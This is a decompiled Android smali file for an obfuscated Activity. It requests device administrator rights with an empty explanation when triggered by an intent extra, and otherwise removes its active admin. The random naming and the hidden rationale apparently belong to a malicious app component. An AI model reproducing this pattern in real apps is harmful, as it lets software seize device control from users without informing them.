.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;
.super Landroid/app/Activity;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/c;

.field private b:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/c;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    new-instance p1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/c;

    invoke-direct {p1, p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/c;-><init>(Landroid/content/Context;)V

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;->b:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/c;

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const-string v0, "str"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "start"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v0, "android.app.extra.DEVICE_ADMIN"

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;->b:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/c;

    invoke-virtual {v1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/c;->a()Landroid/content/ComponentName;

    move-result-object v1

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string v0, "android.app.extra.ADD_EXPLANATION"

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v0, 0x64

    invoke-virtual {p0, p1, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;->startActivityForResult(Landroid/content/Intent;I)V

    goto :goto_0

    :cond_0
    new-instance p1, Landroid/content/ComponentName;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/a;

    invoke-direct {p1, p0, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v0, p1}, Landroid/app/admin/DevicePolicyManager;->removeActiveAdmin(Landroid/content/ComponentName;)V

    :goto_0
    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;->finish()V

    return-void
.end method
